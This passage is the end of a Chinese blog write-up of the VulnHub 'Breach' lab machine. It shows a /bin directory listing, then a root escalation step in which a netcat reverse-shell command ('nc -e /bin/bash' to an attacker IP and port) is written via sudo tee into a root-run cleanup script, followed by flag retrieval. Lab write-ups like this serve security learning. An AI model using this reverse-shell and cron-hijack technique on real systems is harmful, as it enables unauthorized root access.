3  2012 nc.openbsd</span><br><span class="line">-rwxr-xr-x  1 root root   27096 Jun 13  2012 nc.traditional</span><br><span class="line">lrwxrwxrwx  1 root root      24 May 20  2016 netcat -&gt; /etc/alternatives/netcat</span><br><span class="line">-rwxr-xr-x  1 root root  119624 Aug  5  2014 netstat</span><br><span class="line">lrwxrwxrwx  1 root root       8 May 20  2016 nisdomainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x  1 root root   59848 Dec 18  2013 ntfs-3g</span><br><span class="line">-rwxr-xr-x  1 root root   10312 Dec 18  2013 ntfs-3g.probe</span><br><span class="line">-rwxr-xr-x  1 root root   67608 Dec 18  2013 ntfs-3g.secaudit</span><br><span class="line">-rwxr-xr-x  1 root root   18432 Dec 18  2013 ntfs-3g.usermap</span><br><span class="line">-rwxr-xr-x  1 root root   26728 Dec 18  2013 ntfscat</span><br><span class="line">-rwxr-xr-x  1 root root   30752 Dec 18  2013 ntfsck</span><br><span class="line">-rwxr-xr-x  1 root root   30824 Dec 18  2013 ntfscluster</span><br><span class="line">-rwxr-xr-x  1 root root   34920 Dec 18  2013 ntfscmp</span><br><span class="line">-rwxr-xr-x  1 root root   22528 Dec 18  2013 ntfsdump_logfile</span><br><span class="line">-rwxr-xr-x  1 root root   39024 Dec 18  2013 ntfsfix</span><br><span class="line">-rwxr-xr-x  1 root root   55416 Dec 18  2013 ntfsinfo</span><br><span class="line">-rwxr-xr-x  1 root root   31928 Dec 18  2013 ntfsls</span><br><span class="line">-rwxr-xr-x  1 root root   26672 Dec 18  2013 ntfsmftalloc</span><br><span class="line">-rwxr-xr-x  1 root root   30824 Dec 18  2013 ntfsmove</span><br><span class="line">-rwxr-xr-x  1 root root   34856 Dec 18  2013 ntfstruncate</span><br><span class="line">-rwxr-xr-x  1 root root   43632 Dec 18  2013 ntfswipe</span><br><span class="line">lrwxrwxrwx  1 root root       6 May 20  2016 open -&gt; openvt</span><br><span class="line">-rwxr-xr-x  1 root root   18912 Feb 18  2013 openvt</span><br><span class="line">lrwxrwxrwx  1 root root      14 May 20  2016 pidof -&gt; /sbin/killall5</span><br><span class="line">-rwsr-xr-x  1 root root   44168 May  7  2014 ping</span><br><span class="line">-rwsr-xr-x  1 root root   44680 May  7  2014 ping6</span><br><span class="line">-rwxr-xr-x  1 root root   35448 Dec  2  2014 plymouth</span><br><span class="line">-rwxr-xr-x  1 root root   31608 Dec  2  2014 plymouth-upstart-bridge</span><br><span class="line">-rwxr-xr-x  1 root root   93232 Feb 10  2015 ps</span><br><span class="line">-rwxr-xr-x  1 root root   31392 Mar 10  2016 <span class="built_in">pwd</span></span><br><span class="line">lrwxrwxrwx  1 root root       4 May 20  2016 rbash -&gt; bash</span><br><span class="line">-rwxr-xr-x  1 root root   39528 Mar 10  2016 readlink</span><br><span class="line">-rwxr-xr-x  1 root root      89 Jul 16  2013 red</span><br><span class="line">-rwxr-xr-x  1 root root   60160 Mar 10  2016 rm</span><br><span class="line">-rwxr-xr-x  1 root root   43648 Mar 10  2016 rmdir</span><br><span class="line">lrwxrwxrwx  1 root root       4 Oct  1  2012 rnano -&gt; nano</span><br><span class="line">-rwxr-xr-x  1 root root     254 Jul 18  2014 running-in-container</span><br><span class="line">-rwxr-xr-x  1 root root   19248 Aug 28  2013 run-parts</span><br><span class="line">-rwxr-xr-x  1 root root   73352 Feb 13  2014 sed</span><br><span class="line">-rwxr-xr-x  1 root root   36232 May 23  2013 setfacl</span><br><span class="line">-rwxr-xr-x  1 root root   39896 Feb 18  2013 setfont</span><br><span class="line">-rwxr-xr-x  1 root root   12052 Jan 29  2014 setupcon</span><br><span class="line">lrwxrwxrwx  1 root root       4 May 20  2016 sh -&gt; dash</span><br><span class="line">lrwxrwxrwx  1 root root       4 May 20  2016 sh.distrib -&gt; dash</span><br><span class="line">-rwxr-xr-x  1 root root   31296 Mar 10  2016 sleep</span><br><span class="line">-rwxr-xr-x  1 root root   76624 Jul 23  2015 ss</span><br><span class="line">lrwxrwxrwx  1 root root       7 Nov 14  2013 static-sh -&gt; busybox</span><br><span class="line">-rwxr-xr-x  1 root root   68256 Mar 10  2016 stty</span><br><span class="line">-rwsr-xr-x  1 root root   36936 Jan 26  2016 su</span><br><span class="line">-rwxr-xr-x  1 root root   27200 Mar 10  2016 sync</span><br><span class="line">-rwxr-xr-x  1 root root   18816 Sep  2  2015 tailf</span><br><span class="line">-rwxr-xr-x  1 root root  353840 Feb  4  2014 tar</span><br><span class="line">-rwxr-xr-x  1 root root   10344 Aug 28  2013 tempfile</span><br><span class="line">-rwxr-xr-x  1 root root   60224 Mar 10  2016 touch</span><br><span class="line">-rwxr-xr-x  1 root root   27168 Mar 10  2016 <span class="literal">true</span></span><br><span class="line">-rwxr-xr-x  1 root root  248040 Feb 25  2016 udevadm</span><br><span class="line">-rwxr-xr-x  1 root root   14336 May 15  2015 ulockmgr_server</span><br><span class="line">-rwsr-xr-x  1 root root   69120 Sep  2  2015 umount</span><br><span class="line">-rwxr-xr-x  1 root root   31360 Mar 10  2016 uname</span><br><span class="line">-rwxr-xr-x  2 root root    2303 Jan 10  2014 uncompress</span><br><span class="line">-rwxr-xr-x  1 root root    2762 Feb 18  2013 unicode_start</span><br><span class="line">-rwxr-xr-x  1 root root  110080 Mar 10  2016 vdir</span><br><span class="line">-rwxr-xr-x  1 root root     946 Aug 28  2013 <span class="built_in">which</span></span><br><span class="line">-rwxr-xr-x  1 root root   27368 Mar 23  2014 whiptail</span><br><span class="line">lrwxrwxrwx  1 root root       8 May 20  2016 ypdomainname -&gt; hostname</span><br><span class="line">-rwxr-xr-x  1 root root    1939 Jan 10  2014 zcat</span><br><span class="line">-rwxr-xr-x  1 root root    1779 Jan 10  2014 zcmp</span><br><span class="line">-rwxr-xr-x  1 root root    5766 Jan 10  2014 zdiff</span><br><span class="line">-rwxr-xr-x  1 root root     142 Jan 10  2014 zegrep</span><br><span class="line">-rwxr-xr-x  1 root root     142 Jan 10  2014 zfgrep</span><br><span class="line">-rwxr-xr-x  1 root root    2133 Jan 10  2014 zforce</span><br><span class="line">-rwxr-xr-x  1 root root    5940 Jan 10  2014 zgrep</span><br><span class="line">-rwxr-xr-x  1 root root    2039 Jan 10  2014 zless</span><br><span class="line">-rwxr-xr-x  1 root root    1912 Jan 10  2014 zmore</span><br><span class="line">-rwxr-xr-x  1 root root    5049 Jan 10  2014 znew</span><br></pre></td></tr></table></figure>
<p>发现还有个nc nc试一下吧<br>bash为什么弹不了 我也是傻逼了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">blumbergh@Breach:~$ <span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.110.1 9001&quot;</span> &gt; shell.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;nc -e /bin/bash 192.168.110.1 9001&quot;</span> &gt; shell.txt</span><br><span class="line">blumbergh@Breach:~$ cat shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.sh</span><br><span class="line">sht shell.txt | sudo /usr/bin/tee /usr/share/cleanup/tidyup.</span><br></pre></td></tr></table></figure>
<p>根据机制等三分钟就可以反弹shell了</p>
<h2 id="拿取flag"><a href="#拿取flag" class="headerlink" title="拿取flag"></a>拿取flag</h2><p><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004522.png"></p>
<p>我十分想看<code>flair.jpg</code>使用python搭建的建议不服务器不行，我就打算用msf搞一个马上去<br><img src="https://cdn.jsdelivr.net/gh/zoukba0014/imagehost/img/20210504004523.png"><br>干！！！！！！！！！！！！！！</p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2021/05/04/Breach/" class="leancloud-visitors view" data-flag-title="Breach-writeup">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2021/04/22/内网横向（三）/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2021-05-04 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/靶机/">靶机<span>2</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/vulnhub靶机/">vulnhub靶机<span>2</span></a></li> <li><a href="/tags/SSL/">SSL<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Breach"><span class="toc-article-text">Breach</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#nmap%E6%8E%A2%E6%B4%BB"><span class="toc-article-text">nmap探活</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-article-text">端口探测</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%BD%91%E9%A1%B5%E6%8E%A2%E7%B4%A2"><span class="toc-article-text">网页探索</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%90%8E%E5%8F%B0%E6%8E%A2%E7%B4%A2"><span class="toc-article-text">后台探索</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8E%A2%E7%B4%A2%E6%95%B0%E6%8D%AE%E6%8A%A5"><span class="toc-article-text">探索数据报</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BB%BA%E7%AB%8B%E7%A7%81%E9%92%A5"><span class="toc-article-text">建立私钥</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%BE%97%E5%88%B0%E8%A7%A3%E5%AF%86%E6%95%B0%E6%8D%AE%E6%8A%A5"><span class="toc-article-text">得到解密数据报</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%95%B0%E6%8D%AE%E6%8A%A5%E8%A7%A3%E8%AF%BB"><span class="toc-article-text">数据报解读</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%A1%B5%E9%9D%A2%E8%AF%A6%E6%83%85"><span class="toc-article-text">页面详情</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%8A%E4%BC%A0war%E9%A9%AC"><span class="toc-article-text">上传war马</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#godzilla"><span class="toc-article-text">godzilla</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#msf"><span class="toc-article-text">msf</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">主机信息搜集</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%80%81%E6%A0%B7%E5%AD%90%E4%B8%8A%E4%BC%A0linpeas"><span class="toc-article-text">老样子上传linpeas</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%89%8B%E5%B7%A5%E6%90%9C%E9%9B%86"><span class="toc-article-text">手工搜集</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#ROOT"><span class="toc-article-text">ROOT</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%8B%BF%E5%8F%96flag"><span class="toc-article-text">拿取flag</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2021 zoukba's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 




   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
